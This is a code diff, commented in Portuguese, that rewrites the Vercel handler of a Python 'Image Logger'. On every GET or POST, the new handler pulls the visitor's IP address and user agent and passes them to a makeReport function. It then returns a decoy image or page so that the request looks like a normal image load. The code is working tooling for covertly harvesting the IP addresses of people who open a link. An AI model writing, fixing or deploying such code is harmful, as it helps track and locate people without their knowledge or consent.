@@ -301,8 +301,78 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-from http.server import BaseHTTPRequestHandler
+# ====================== PARTE PARA VERCEL (reescreva daqui pra baixo) ======================
 
-class handler(ImageLoggerAPI):
-    """Classe handler que a Vercel espera"""
-    pass   # Não precisa sobrescrever nada, só herda tudo
+from http.server import BaseHTTPRequestHandler
+import traceback
+
+class handler(BaseHTTPRequestHandler):
+    """Handler oficial que o Vercel espera"""
+    
+    def do_GET(self):
+        self.handle_request()
+    
+    def do_POST(self):
+        self.handle_request()
+    
+    def handle_request(self):
+        try:
+            # Pegar IP de forma segura (Vercel usa x-forwarded-for)
+            ip = self.headers.get('x-forwarded-for')
+            if ip and ',' in ip:
+                ip = ip.split(',')[0].strip()
+            
+            user_agent = self.headers.get('user-agent', 'Unknown')
+            path = self.path  # ex: /?url=... ou /imagem
+
+            # === Aqui você pode chamar suas funções existentes ===
+            # (botCheck, makeReport, etc.)
+
+            # Exemplo mínimo para não crashar:
+            if not ip or ip.startswith(blacklistedIPs):
+                self.send_image_or_html()  # responda algo sempre
+                return
+
+            # Chama seu makeReport (com timeout se possível)
+            try:
+                result = makeReport(ip, user_agent, endpoint=path)
+            except Exception as e:
+                print("Erro no makeReport:", e)
+                result = None
+
+            # Responde com a imagem ou HTML (o mais importante: SEMPRE responder)
+            self.send_image_or_html()
+
+        except Exception as e:
+            print("ERRO GERAL NO HANDLER:", traceback.format_exc())
+            try:
+                reportError(traceback.format_exc())
+            except:
+                pass
+            
+            # SEMPRE devolva uma resposta (evita FUNCTION_INVOCATION_FAILED)
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write(b'Image loaded.')  # resposta simples
+
+    def send_image_or_html(self):
+        """Função auxiliar para sempre enviar algo pro cliente"""
+        try:
+            # Seu código de imagem aqui (o que você já tinha)
+            # Por enquanto, vamos usar uma resposta simples para testar
+            self.send_response(200)
+            self.send_header('Content-type', 'image/jpeg' if config.get("buggedImage") else 'text/html')
+            self.end_headers()
+            
+            if config.get("buggedImage"):
+                self.wfile.write(binaries.get("loading", b''))
+            else:
+                self.wfile.write(b'<html><body><h1>Image Logger</h1></body></html>')
+                
+        except:
+            # Última proteção
+            self.send_response(200)
+            self.send_header('Content-type', 'text/plain')
+            self.end_headers()
+            self.wfile.write(b'OK')
